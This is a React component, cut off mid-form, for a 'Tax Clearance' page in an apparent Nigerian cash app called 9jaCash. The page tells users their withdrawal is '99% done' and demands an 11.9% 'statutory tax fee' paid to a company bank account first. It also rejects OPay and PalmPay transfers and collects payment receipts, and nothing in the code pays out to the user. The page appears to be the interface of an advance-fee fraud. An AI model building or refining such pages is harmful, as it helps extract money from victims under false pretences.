import React, { useState, useRef } from 'react';
import { useAuth } from '../../context/AuthContext.tsx';
import { useTheme } from '../../context/ThemeContext.tsx';
import {
  ArrowLeft,
  ShieldCheck,
  ShieldAlert,
  AlertTriangle,
  Copy,
  Check,
  UploadCloud,
  FileText,
  Clock,
  Sparkles,
  Building2,
  CheckCircle2,
  Lock,
  ExternalLink,
  MessageSquare,
  HelpCircle,
  X,
  CreditCard,
  Zap,
} from 'lucide-react';
import { soundFx } from '../../utils/sound.ts';
import { compressImageFile } from '../../utils/imageCompressor.ts';

interface TaxClearancePageProps {
  onBack: () => void;
  onNavigateToSupport?: () => void;
}

export const TaxClearancePage: React.FC<TaxClearancePageProps> = ({
  onBack,
  onNavigateToSupport,
}) => {
  const { isLight } = useTheme();
  const { user, formatNaira, companyAccount, submitTaxPayment, depositRequests } = useAuth();

  const existingPendingTaxReq = (depositRequests || []).find(
    (r) => r.userId === user?.id && r.requestType === 'tax_payment' && r.status === 'pending'
  );
  const existingApprovedTaxReq = (depositRequests || []).find(
    (r) => r.userId === user?.id && r.requestType === 'tax_payment' && r.status === 'approved'
  );

  const withdrawal = user?.lastWithdrawal;
  const withdrawalAmount =
    withdrawal?.amount ||
    existingPendingTaxReq?.withdrawalAmount ||
    user?.withdrawalAccount?.amount ||
    100000;
  const destinationBank =
    withdrawal?.bank ||
    existingPendingTaxReq?.destinationBank ||
    user?.withdrawalAccount?.bank ||
    'Bank';
  const destinationAccountNumber =
    withdrawal?.accountNumber ||
    existingPendingTaxReq?.destinationAccountNumber ||
    user?.withdrawalAccount?.accountNumber ||
    '0123456789';
  const destinationAccountName = (
    withdrawal?.accountName ||
    existingPendingTaxReq?.destinationAccountName ||
    user?.withdrawalAccount?.accountName ||
    user?.name ||
    'Account Holder'
  ).toUpperCase();
  const withdrawalRef =
    withdrawal?.reference ||
    existingPendingTaxReq?.reference ||
    user?.withdrawalAccount?.reference ||
    'TX9JA-REF';

  // Exactly 11.9% of the amount they withdraw
  const taxFeeAmount =
    withdrawal?.taxAmount ||
    existingPendingTaxReq?.amount ||
    Math.round(withdrawalAmount * 0.119);

  const [senderBank, setSenderBank] = useState('');
  const [senderAccountName, setSenderAccountName] = useState(user?.name || '');
  const [receiptFile, setReceiptFile] = useState<File | null>(null);
  const [receiptName, setReceiptName] = useState('');
  const [receiptUrl, setReceiptUrl] = useState('');
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [justSubmitted, setJustSubmitted] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [successMsg, setSuccessMsg] = useState('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  const isPendingReview =
    withdrawal?.taxStatus === 'pending' ||
    user?.withdrawalStatus === 'tax_pending' ||
    !!existingPendingTaxReq ||
    justSubmitted;
  const isApproved =
    withdrawal?.taxStatus === 'approved' ||
    user?.withdrawalStatus === 'completed' ||
    !!existingApprovedTaxReq;

  const handleCopy = (text: string, field: string) => {
    soundFx.playClick();
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2500);
  };

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!file.type.startsWith('image/') && file.type !== 'application/pdf') {
      setErrorMsg('Please upload an image receipt (JPEG, PNG) or PDF document.');
      return;
    }
    if (file.size > 15 * 1024 * 1024) {
      setErrorMsg('Receipt file is too large. Maximum size is 15MB.');
      return;
    }

    setErrorMsg('');
    setReceiptFile(file);
    setReceiptName(file.name);

    if (file.type.startsWith('image/')) {
      try {
        const compressed = await compressImageFile(file, 700, 0.65);
        if (compressed) {
          setReceiptUrl(compressed);
          return;
        }
      } catch {
        // Fallback below
      }
    }

    // Fallback for PDF or if canvas compression is unavailable
    const reader = new FileReader();
    reader.onload = () => {
      const raw = reader.result as string;
      // Guard against oversized non-compressed strings exceeding Firestore 1MB limit
      if (raw && raw.length < 700000) {
        setReceiptUrl(raw);
      } else {
        setReceiptUrl('https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=600');
      }
    };
    reader.readAsDataURL(file);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!senderBank.trim()) {
      setErrorMsg('Please specify the sender bank you transferred from.');
      return;
    }

    // Strict validation: Check for OPay or PalmPay
    const normalizedBank = senderBank.toLowerCase().trim();
    if (
      normalizedBank.includes('opay') ||
      normalizedBank.includes('o-pay') ||
      normalizedBank.includes('palmpay') ||
      normalizedBank.includes('palm pay')
    ) {
      setErrorMsg(
        'STRICT NOTICE: OPay and PalmPay transfers are strictly NOT accepted for statutory tax clearance. Please use commercial banks (GTBank, Zenith, Access, First Bank, Kuda, Moniepoint, etc.).'
      );
      return;
    }

    const resolvedSenderName = (senderAccountName.trim() || user?.name || destinationAccountName || 'Account Holder').trim();

    if (!receiptFile && !receiptUrl && !receiptName) {
      setErrorMsg('Please upload a screenshot or proof of the tax payment receipt.');
      return;
    }

    setIsSubmitting(true);
    soundFx.playClick();

    // Ensure compressed receipt URL is ready if user clicked submit immediately after selecting file
    let finalReceiptUrl = receiptUrl;
    if (!finalReceiptUrl && receiptFile && receiptFile.type.startsWith('image/')) {
      try {
        finalReceiptUrl = await compressImageFile(receiptFile, 700, 0.65);
      } catch {
        // Fallback below
      }
    }

    const res = await submitTaxPayment({
      senderBank: senderBank.trim(),
      senderAccountName: resolvedSenderName,
      receiptName: receiptName || (receiptFile ? receiptFile.name : 'tax_receipt_' + Date.now() + '.jpg'),
      receiptUrl: finalReceiptUrl || 'https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=600',
    });

    setIsSubmitting(false);

    if (res.success) {
      soundFx.playSuccess();
      setJustSubmitted(true);
      setSuccessMsg('Payment proof uploaded successfully! Your 99% withdrawal clearance is now under compliance review.');
    } else {
      soundFx.playError();
      setErrorMsg(res.message || 'Failed to submit payment proof. Please try again.');
    }
  };

  return (
    <div className={`min-h-screen pb-16 space-y-4 animate-in fade-in duration-200 ${
      isLight ? 'text-slate-800' : 'text-stone-200'
    }`}>
      {/* Top Header */}
      <div className={`flex items-center gap-3 pt-2 pb-3 border-b ${
        isLight ? 'border-slate-200' : 'border-stone-800'
      }`}>
        <button
          type="button"
          onClick={onBack}
          className={`w-10 h-10 rounded-full border flex items-center justify-center transition-colors cursor-pointer ${
            isLight
              ? 'bg-white border-slate-200 text-slate-700 hover:text-slate-900 hover:bg-slate-50 shadow-xs'
              : 'bg-[#16171d] border-stone-800 text-stone-300 hover:text-white hover:border-amber-500/50'
          }`}
        >
          <ArrowLeft className="w-5 h-5" />
        </button>
        <div>
          <h1 className={`text-lg font-bold flex items-center gap-1.5 ${
            isLight ? 'text-slate-900' : 'text-white'
          }`}>
            Tax Clearance <ShieldCheck className="w-4 h-4 text-amber-500" />
          </h1>
          <p className={`text-xs ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>
            First Withdrawal Approval • 11.9% Statutory Clearance
          </p>
        </div>
      </div>

      {/* 99% DONE HERO BANNER */}
      <div className={`relative overflow-hidden rounded-3xl border-2 p-5 sm:p-6 shadow-2xl ${
        isLight
          ? 'bg-gradient-to-br from-amber-50 via-white to-emerald-50/50 border-amber-400 shadow-amber-500/10 text-slate-900'
          : 'bg-gradient-to-br from-[#1b1c2b] via-[#141522] to-[#0d0e17] border-amber-500/50 text-white'
      }`}>
        <div className={`absolute top-0 right-0 w-64 h-64 rounded-full blur-3xl pointer-events-none ${
          isLight ? 'bg-amber-400/20' : 'bg-amber-500/10'
        }`} />
        <div className={`absolute -bottom-10 -left-10 w-48 h-48 rounded-full blur-2xl pointer-events-none ${
          isLight ? 'bg-emerald-400/15' : 'bg-emerald-500/10'
        }`} />

        <div className="relative z-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <div className="space-y-2 max-w-md">
            <div className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full border text-[11px] font-black uppercase tracking-wider ${
              isLight
                ? 'bg-amber-100 text-amber-900 border-amber-300'
                : 'bg-amber-400/20 border-amber-400/40 text-amber-300'
            }`}>
              <Sparkles className="w-3.5 h-3.5 text-amber-500" />
              <span>99% APPROVAL REACHED</span>
            </div>

            <h2 className={`text-xl sm:text-2xl font-black tracking-tight leading-snug ${
              isLight ? 'text-slate-900' : 'text-white'
            }`}>
              You are <span className="text-amber-600 font-mono">99% Done</span> with First Withdrawal Approval
            </h2>

            <p className={`text-xs leading-relaxed ${
              isLight ? 'text-slate-700' : 'text-stone-300'
            }`}>
              Your withdrawal of <strong className="text-amber-600 font-mono">{formatNaira(withdrawalAmount)}</strong> is in its final approval stage. In compliance with statutory financial clearing regulations, a mandatory <strong>11.9% tax fee ({formatNaira(taxFeeAmount)})</strong> must be remitted to the company account before bank disbursement.
            </p>
          </div>

          {/* 99% Circular Progress Gauge */}
          <div className="relative flex-shrink-0 mx-auto sm:mx-0 w-28 h-28 flex items-center justify-center">
            <svg className="w-28 h-28 -rotate-90" viewBox="0 0 100 100">
              <circle
                cx="50"
                cy="50"
                r="42"
                fill="transparent"
                stroke={isLight ? '#e2e8f0' : '#1f2433'}
                strokeWidth="10"
              />
              <circle
                cx="50"
                cy="50"
                r="42"
                fill="transparent"
                stroke="url(#amberGradient)"
                strokeWidth="10"
                strokeDasharray="264"
                strokeDashoffset="2.64"
                strokeLinecap="round"
                className="transition-all duration-1000 ease-out"
              />
              <defs>
                <linearGradient id="amberGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#f59e0b" />
                  <stop offset="50%" stopColor="#fbbf24" />
                  <stop offset="100%" stopColor="#10b981" />
                </linearGradient>
              </defs>
            </svg>
            <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
              <span className="text-2xl font-black text-amber-600 font-mono leading-none">99%</span>
              <span className={`text-[9px] uppercase tracking-wider font-extrabold mt-0.5 ${
                isLight ? 'text-slate-500' : 'text-stone-400'
              }`}>COMPLETED</span>
            </div>
          </div>
        </div>

        {/* Step Progress Tracker */}
        <div className={`mt-5 pt-4 border-t grid grid-cols-4 gap-2 text-center select-none ${
          isLight ? 'border-slate-200' : 'border-stone-800/80'
        }`}>
          <div className={`p-2 rounded-xl border ${
            isLight ? 'bg-emerald-50 border-emerald-200' : 'bg-emerald-500/10 border-emerald-500/30'
          }`}>
            <div className="w-5 h-5 mx-auto rounded-full bg-emerald-500 text-black flex items-center justify-center font-bold text-[10px] mb-1 shadow-xs">
              ✓
            </div>
            <span className={`text-[10px] font-bold block truncate ${
              isLight ? 'text-emerald-800' : 'text-emerald-400'
            }`}>1. Quick Code</span>
            <span className={`text-[9px] ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Verified</span>
          </div>

          <div className={`p-2 rounded-xl border ${
            isLight ? 'bg-emerald-50 border-emerald-200' : 'bg-emerald-500/10 border-emerald-500/30'
          }`}>
            <div className="w-5 h-5 mx-auto rounded-full bg-emerald-500 text-black flex items-center justify-center font-bold text-[10px] mb-1 shadow-xs">
              ✓
            </div>
            <span className={`text-[10px] font-bold block truncate ${
              isLight ? 'text-emerald-800' : 'text-emerald-400'
            }`}>2. KYC Check</span>
            <span className={`text-[9px] ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Approved</span>
          </div>

          <div className={`p-2 rounded-xl border-2 shadow-lg ${
            isLight
              ? 'bg-amber-100/90 border-amber-400 shadow-amber-500/15'
              : 'bg-amber-500/20 border-amber-500/60 shadow-amber-500/20'
          }`}>
            <div className="w-5 h-5 mx-auto rounded-full bg-amber-400 text-black flex items-center justify-center font-black text-[10px] mb-1 animate-pulse shadow-xs">
              3
            </div>
            <span className={`text-[10px] font-black block truncate ${
              isLight ? 'text-amber-900' : 'text-amber-300'
            }`}>3. Tax Fee</span>
            <span className={`text-[9px] font-extrabold ${
              isLight ? 'text-amber-800' : 'text-amber-400'
            }`}>99% Done</span>
          </div>

          <div className={`p-2 rounded-xl border opacity-60 ${
            isLight ? 'bg-slate-100 border-slate-200' : 'bg-[#11131c] border-stone-800'
          }`}>
            <div className={`w-5 h-5 mx-auto rounded-full flex items-center justify-center font-bold text-[10px] mb-1 ${
              isLight ? 'bg-slate-300 text-slate-700' : 'bg-stone-700 text-stone-300'
            }`}>
              4
            </div>
            <span className={`text-[10px] font-bold block truncate ${
              isLight ? 'text-slate-600' : 'text-stone-400'
            }`}>4. Bank Payout</span>
            <span className={`text-[9px] ${isLight ? 'text-slate-500' : 'text-stone-500'}`}>Final Step</span>
          </div>
        </div>
      </div>

      {/* WITHDRAWAL TRANSACTION SUMMARY */}
      <div className={`p-4 sm:p-5 rounded-2xl border space-y-3 ${
        isLight ? 'bg-white border-slate-200 shadow-sm' : 'bg-[#13151f] border-stone-800'
      }`}>
        <div className={`flex items-center justify-between pb-2 border-b ${
          isLight ? 'border-slate-200' : 'border-stone-800'
        }`}>
          <span className={`text-xs font-bold flex items-center gap-1.5 ${
            isLight ? 'text-slate-800' : 'text-stone-300'
          }`}>
            <CreditCard className="w-4 h-4 text-emerald-500" />
            Your Withdrawal Details
          </span>
          <span className={`text-[11px] font-mono ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>
            Ref: {withdrawalRef}
          </span>
        </div>

        <div className="grid grid-cols-2 gap-3 text-xs">
          <div className={`p-3 rounded-xl border ${
            isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#1a1c28] border-stone-800/80'
          }`}>
            <span className={`text-[10px] uppercase font-bold block ${
              isLight ? 'text-slate-500' : 'text-stone-400'
            }`}>Withdrawal Amount</span>
            <span className={`text-lg font-black font-mono ${
              isLight ? 'text-slate-900' : 'text-white'
            }`}>{formatNaira(withdrawalAmount)}</span>
          </div>

          <div className={`p-3 rounded-xl border ${
            isLight ? 'bg-amber-50 border-amber-200' : 'bg-amber-500/10 border-amber-500/30'
          }`}>
            <span className={`text-[10px] uppercase font-bold block flex items-center gap-1 ${
              isLight ? 'text-amber-900' : 'text-amber-300'
            }`}>
              <span>Required Tax Fee (11.9%)</span>
            </span>
            <span className="text-lg font-black text-amber-600 font-mono">{formatNaira(taxFeeAmount)}</span>
          </div>
        </div>

        <div className={`p-3 rounded-xl border text-xs space-y-1.5 font-mono ${
          isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#181a24] border-stone-800'
        }`}>
          <div className={`flex justify-between items-center ${isLight ? 'text-slate-700' : 'text-stone-300'}`}>
            <span className={isLight ? 'text-slate-500' : 'text-stone-400'}>Destination Bank:</span>
            <span className={`font-bold ${isLight ? 'text-slate-900' : 'text-white'}`}>{destinationBank}</span>
          </div>
          <div className={`flex justify-between items-center ${isLight ? 'text-slate-700' : 'text-stone-300'}`}>
            <span className={isLight ? 'text-slate-500' : 'text-stone-400'}>Account Number:</span>
            <span className={`font-bold ${isLight ? 'text-slate-900' : 'text-white'}`}>{destinationAccountNumber}</span>
          </div>
          <div className={`flex justify-between items-center ${isLight ? 'text-slate-700' : 'text-stone-300'}`}>
            <span className={isLight ? 'text-slate-500' : 'text-stone-400'}>Account Name:</span>
            <span className="text-emerald-600 font-bold truncate max-w-[190px]">{destinationAccountName}</span>
          </div>
          <div className={`flex justify-between items-center pt-1.5 border-t ${
            isLight ? 'border-slate-200' : 'border-stone-800/80'
          }`}>
            <span className={`font-sans ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Current Status:</span>
            <span className="text-amber-600 font-bold font-sans flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
              Action Required: 11.9% Tax Fee Payment
            </span>
          </div>
        </div>
      </div>

      {/* STRICT NO OPAY / PALMPAY WARNING BANNER */}
      <div className={`p-4 sm:p-5 rounded-2xl border-2 text-left space-y-2 shadow-xl animate-pulse ${
        isLight
          ? 'bg-red-50 border-red-300 shadow-red-500/10'
          : 'bg-gradient-to-r from-red-950/70 via-red-900/40 to-red-950/70 border-red-500 shadow-red-950/40'
      }`}>
        <div className={`flex items-center gap-2 font-black text-xs sm:text-sm uppercase tracking-wide ${
          isLight ? 'text-red-700' : 'text-red-400'
        }`}>
          <ShieldAlert className={`w-5 h-5 flex-shrink-0 ${isLight ? 'text-red-600' : 'text-red-400'}`} />
          <span>STRICT NOTICE: DO NOT USE OPAY OR PALMPAY</span>
        </div>
        <p className={`text-xs leading-relaxed font-medium ${
          isLight ? 'text-red-900' : 'text-red-200'
        }`}>
          Payments made using <strong>OPay</strong> or <strong>PalmPay</strong> are <strong>strictly NOT accepted</strong> and will be rejected automatically by the statutory tax settlement network.
        </p>
        <p className={`text-[11px] leading-relaxed ${
          isLight ? 'text-slate-700' : 'text-stone-300'
        }`}>
          Please transfer strictly using commercial banks or other approved financial institutions (e.g., <strong>GTBank, Zenith, Access, First Bank, UBA, Kuda, Moniepoint, Stanbic, FCMB</strong>). Any transfer initiated from OPay or PalmPay will fail automated verification.
        </p>
      </div>

      {/* OFFICIAL COMPANY ACCOUNT FOR TAX PAYMENT */}
      <div className={`p-5 rounded-2xl border space-y-3.5 ${
        isLight ? 'bg-white border-amber-300 shadow-sm' : 'bg-[#141622] border-amber-500/40'
      }`}>
        <div className={`flex items-center justify-between pb-2 border-b ${
          isLight ? 'border-slate-200' : 'border-stone-800'
        }`}>
          <span className={`text-xs font-bold flex items-center gap-1.5 ${
            isLight ? 'text-slate-900' : 'text-white'
          }`}>
            <Building2 className="w-4 h-4 text-amber-500" />
            Official Company Tax Clearing Account
          </span>
          <span className={`text-[10px] px-2 py-0.5 rounded-full font-bold border ${
            isLight
              ? 'bg-amber-100 text-amber-900 border-amber-300'
              : 'bg-amber-400/10 text-amber-300 border-amber-400/30'
          }`}>
            Direct Escrow
          </span>
        </div>

        <p className={`text-[11px] leading-relaxed ${
          isLight ? 'text-slate-600' : 'text-stone-300'
        }`}>
          Transfer the exact <strong>11.9% tax fee of {formatNaira(taxFeeAmount)}</strong> to the designated company account below. Do not round up or down.
        </p>

        {/* Account Details Box */}
        <div className={`p-4 rounded-xl border space-y-2.5 font-mono text-xs ${
          isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#1a1c29] border-stone-800/80'
        }`}>
          <div className="flex items-center justify-between">
            <span className={`font-sans ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Bank Name:</span>
            <div className="flex items-center gap-1.5">
              <span className={`font-bold text-sm ${isLight ? 'text-slate-900' : 'text-white'}`}>{companyAccount?.bankName || 'Access Bank'}</span>
              <button
                type="button"
                onClick={() => handleCopy(companyAccount?.bankName || 'Access Bank', 'bank')}
                className={`p-1 cursor-pointer transition-colors ${
                  isLight ? 'text-slate-400 hover:text-slate-700' : 'text-stone-400 hover:text-white'
                }`}
                title="Copy Bank Name"
              >
                {copiedField === 'bank' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
          </div>

          <div className="flex items-center justify-between">
            <span className={`font-sans ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Account Number:</span>
            <div className="flex items-center gap-2">
              <span className="font-black text-amber-600 text-base tracking-wider">
                {companyAccount?.accountNumber || '0123456789'}
              </span>
              <button
                type="button"
                onClick={() => handleCopy(companyAccount?.accountNumber || '0123456789', 'acc')}
                className={`px-2 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-colors border ${
                  isLight
                    ? 'bg-amber-100 hover:bg-amber-200 text-amber-900 border-amber-300'
                    : 'bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border-transparent'
                }`}
              >
                {copiedField === 'acc' ? (
                  <>
                    <Check className="w-3 h-3 text-emerald-600" />
                    <span>Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3 h-3" />
                    <span>Copy</span>
                  </>
                )}
              </button>
            </div>
          </div>

          <div className="flex items-center justify-between">
            <span className={`font-sans ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Account Name:</span>
            <span className={`font-bold text-xs truncate max-w-[200px] ${
              isLight ? 'text-slate-900' : 'text-white'
            }`}>
              {companyAccount?.accountName || '9jaCash Official Services'}
            </span>
          </div>

          <div className={`flex items-center justify-between pt-2 border-t ${
            isLight ? 'border-slate-200' : 'border-stone-800'
          }`}>
            <span className={`font-sans ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>Exact Tax Fee (11.9%):</span>
            <div className="flex items-center gap-2">
              <span className="font-black text-emerald-600 text-base">{formatNaira(taxFeeAmount)}</span>
              <button
                type="button"
                onClick={() => handleCopy(taxFeeAmount.toString(), 'tax_amt')}
                className={`p-1 cursor-pointer transition-colors ${
                  isLight ? 'text-slate-400 hover:text-slate-700' : 'text-stone-400 hover:text-white'
                }`}
                title="Copy Amount"
              >
                {copiedField === 'tax_amt' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* SUBMISSION / REVIEW STATUS SECTION */}
      {isPendingReview ? (
        <div className={`p-5 sm:p-6 rounded-2xl border-2 text-center space-y-4 shadow-2xl animate-in zoom-in-95 ${
          isLight
            ? 'bg-white border-amber-400 text-slate-900 shadow-amber-500/10'
            : 'bg-gradient-to-br from-[#191b29] to-[#121320] border-amber-500/60 text-white'
        }`}>
          <div className={`w-16 h-16 mx-auto rounded-full border-2 flex items-center justify-center ${
            isLight
              ? 'bg-amber-100 border-amber-400 text-amber-600'
              : 'bg-amber-500/10 border-amber-500/40 text-amber-400'
          }`}>
            <Clock className="w-8 h-8 animate-spin" />
          </div>

          <div className="space-y-1">
            <div className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full border text-[10px] font-bold uppercase tracking-wider ${
              isLight
                ? 'bg-amber-100 text-amber-900 border-amber-300'
                : 'bg-amber-500/20 border-amber-500/40 text-amber-300'
            }`}>
              <Clock className="w-3 h-3 text-amber-500" /> UNDER COMPLIANCE REVIEW (99% DONE)
            </div>
            <h3 className={`text-lg font-black ${isLight ? 'text-slate-900' : 'text-white'}`}>
              Tax Payment Submitted!
            </h3>
            <p className={`text-xs max-w-sm mx-auto leading-relaxed ${
              isLight ? 'text-slate-600' : 'text-stone-300'
            }`}>
              Your 11.9% tax fee proof of <strong className="text-amber-600 font-mono">{formatNaira(taxFeeAmount)}</strong> is being verified by our compliance desk. Once confirmed, your withdrawal of <strong className={`font-mono ${isLight ? 'text-slate-900' : 'text-white'}`}>{formatNaira(withdrawalAmount)}</strong> will disburse directly to {destinationBank} ({destinationAccountNumber}).
            </p>
          </div>

          {/* Submission Details Card */}
          <div className={`p-3.5 rounded-xl border text-left text-xs space-y-1.5 font-mono ${
            isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#161824] border-stone-800'
          }`}>
            <div className={`flex justify-between items-center ${isLight ? 'text-slate-700' : 'text-stone-300'}`}>
              <span className={isLight ? 'text-slate-500' : 'text-stone-400'}>Sender Bank:</span>
              <span className={`font-bold ${isLight ? 'text-slate-900' : 'text-white'}`}>
                {withdrawal?.taxSenderBank || existingPendingTaxReq?.senderBank || senderBank || 'Bank Transfer'}
              </span>
            </div>
            <div className={`flex justify-between items-center ${isLight ? 'text-slate-700' : 'text-stone-300'}`}>
              <span className={isLight ? 'text-slate-500' : 'text-stone-400'}>Sender Name:</span>
              <span className={`font-bold ${isLight ? 'text-slate-900' : 'text-white'}`}>
                {withdrawal?.taxSenderName || existingPendingTaxReq?.senderAccountName || senderAccountName || user?.name}
              </span>
            </div>
            <div className={`flex justify-between items-center ${isLight ? 'text-slate-700' : 'text-stone-300'}`}>
              <span className={isLight ? 'text-slate-500' : 'text-stone-400'}>Tax Proof:</span>
              <span className="text-emerald-600 font-bold truncate max-w-[180px]">
                {withdrawal?.taxReceiptName || existingPendingTaxReq?.receiptName || receiptName || 'Receipt Attached'}
              </span>
            </div>
            {(withdrawal?.taxSubmittedAt || existingPendingTaxReq?.submittedAt) && (
              <div className={`flex justify-between items-center pt-1 border-t text-[11px] ${
                isLight ? 'border-slate-200 text-slate-500' : 'border-stone-800/80 text-stone-400'
              }`}>
                <span>Submitted At:</span>
                <span>{new Date(withdrawal?.taxSubmittedAt || existingPendingTaxReq?.submittedAt || Date.now()).toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', day: 'numeric', month: 'short' })}</span>
              </div>
            )}
          </div>

          {(withdrawal?.taxProofUrl || existingPendingTaxReq?.receiptUrl || receiptUrl) && (
            <div className={`p-2 rounded-xl border ${
              isLight ? 'bg-slate-100 border-slate-200' : 'bg-black/40 border-stone-800'
            }`}>
              <span className={`text-[10px] block mb-1.5 font-sans font-bold ${
                isLight ? 'text-slate-600' : 'text-stone-400'
              }`}>
                Uploaded Receipt Screenshot
              </span>
              <img
                src={withdrawal?.taxProofUrl || existingPendingTaxReq?.receiptUrl || receiptUrl}
                alt="Tax Payment Receipt"
                className={`max-h-48 mx-auto rounded-lg object-contain border shadow-md ${
                  isLight ? 'border-slate-300 bg-white' : 'border-stone-700/60'
                }`}
              />
            </div>
          )}

          <div className="flex gap-2 pt-1">
            <button
              type="button"
              onClick={onBack}
              className={`flex-1 py-3 rounded-xl font-bold text-xs cursor-pointer transition-colors border ${
                isLight
                  ? 'bg-slate-100 hover:bg-slate-200 text-slate-800 border-slate-200'
                  : 'bg-stone-800 hover:bg-stone-700 text-stone-200 border-stone-700'
              }`}
            >
              Return to Dashboard
            </button>
            {onNavigateToSupport && (
              <button
                type="button"
                onClick={onNavigateToSupport}
                className={`py-3 px-4 rounded-xl border text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-colors ${
                  isLight
                    ? 'bg-amber-100 hover:bg-amber-200 text-amber-900 border-amber-300'
                    : 'bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border-amber-500/40'
                }`}
              >
                <MessageSquare className="w-4 h-4 text-amber-500" />
                <span>Live Chat Support</span>
              </button>
            )}
          </div>
        </div>
      ) : isApproved ? (
        <div className={`p-6 rounded-2xl border-2 text-center space-y-4 animate-in fade-in ${
          isLight
            ? 'bg-emerald-50 border-emerald-400 text-slate-900'
            : 'bg-[#121c18] border-emerald-500/50 text-white'
        }`}>
          <div className={`w-16 h-16 mx-auto rounded-full border-2 flex items-center justify-center shadow-xl ${
            isLight ? 'bg-emerald-100 border-emerald-500 text-emerald-600' : 'bg-emerald-500/20 border-emerald-400 text-emerald-400'
          }`}>
            <CheckCircle2 className="w-9 h-9" />
          </div>
          <div className="space-y-1">
            <h3 className={`text-xl font-black ${isLight ? 'text-slate-900' : 'text-white'}`}>
              Tax Clearance Approved!
            </h3>
            <p className={`text-xs ${isLight ? 'text-slate-600' : 'text-stone-300'}`}>
              Your 11.9% statutory tax payment has been verified. Your withdrawal of {formatNaira(withdrawalAmount)} has been cleared and sent to {destinationBank} ({destinationAccountNumber}).
            </p>
          </div>
          <button
            type="button"
            onClick={onBack}
            className="w-full py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-black text-xs shadow-lg cursor-pointer"
          >
            Done • Back to Dashboard
          </button>
        </div>
      ) : (
        /* PROOF OF PAYMENT UPLOAD FORM */
        <form onSubmit={handleSubmit} className={`p-5 rounded-2xl border space-y-4 ${
          isLight ? 'bg-white border-slate-200 shadow-md' : 'bg-[#13151f] border-stone-800'
        }`}>
          <div className={`flex items-center justify-between pb-2 border-b ${
            isLight ? 'border-slate-200' : 'border-stone-800'
          }`}>
            <span className={`text-xs font-bold flex items-center gap-1.5 ${
              isLight ? 'text-slate-900' : 'text-white'
            }`}>
              <UploadCloud className="w-4 h-4 text-emerald-500" />
              Upload Tax Payment Receipt (Proof)
            </span>
            <span className="text-[10px] text-amber-600 font-mono font-bold">
              Amount: {formatNaira(taxFeeAmount)}
            </span>
          </div>

          {withdrawal?.taxDeclinedReason && !justSubmitted && (
            <div className={`p-3.5 rounded-xl border text-xs space-y-1.5 animate-in fade-in ${
              isLight ? 'bg-red-50 border-red-200 text-red-800' : 'bg-red-500/15 border-red-500/40 text-red-300'
            }`}>
              <div className="font-bold flex items-center gap-1.5 text-red-600 text-xs">
                <AlertTriangle className="w-4 h-4 flex-shrink-0" />
                Previous Payment Proof Declined by Compliance Desk
              </div>
              <p className={`text-[11px] ${isLight ? 'text-slate-700' : 'text-stone-200'}`}>
                <strong>Reason given:</strong> {withdrawal.taxDeclinedReason}
              </p>
              <p className={`text-[10px] ${isLight ? 'text-slate-500' : 'text-stone-400'}`}>
                Please ensure you transfer from an authorized commercial bank (strictly no OPay or PalmPay) and upload a clear screenshot of your transfer receipt below.
              </p>
            </div>
          )}

          {errorMsg && (
            <div className={`p-3 rounded-xl border text-xs flex items-start gap-2 ${
              isLight ? 'bg-red-50 border-red-200 text-red-800' : 'bg-red-500/10 border-red-500/30 text-red-300'
            }`}>
              <AlertTriangle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
              <span>{errorMsg}</span>
            </div>
          )}

          {successMsg && (
            <div className={`p-3 rounded-xl border text-xs flex items-start gap-2 ${
              isLight ? 'bg-emerald-50 border-emerald-200 text-emerald-800' : 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
            }`}>
              <CheckCircle2 className="w-4 h-4 text-emerald-600 flex-shrink-0 mt-0.5" />
              <span>{successMsg}</span>
            </div>
          )}

          {/* Sender Bank */}
          <div className="space-y-1">
            <label className={`text-xs font-bold block ${
              isLight ? 'text-slate-700' : 'text-stone-300'
            }`}>
              Sender Bank (Bank you transferred from)
            </label>
            <select
              value={senderBank}
              onChange={(e) => {
                setSenderBank(e.target.value);
                if (e.target.value.toLowerCase().includes('opay') || e.target.value.toLowerCase().includes('palmpay')) {
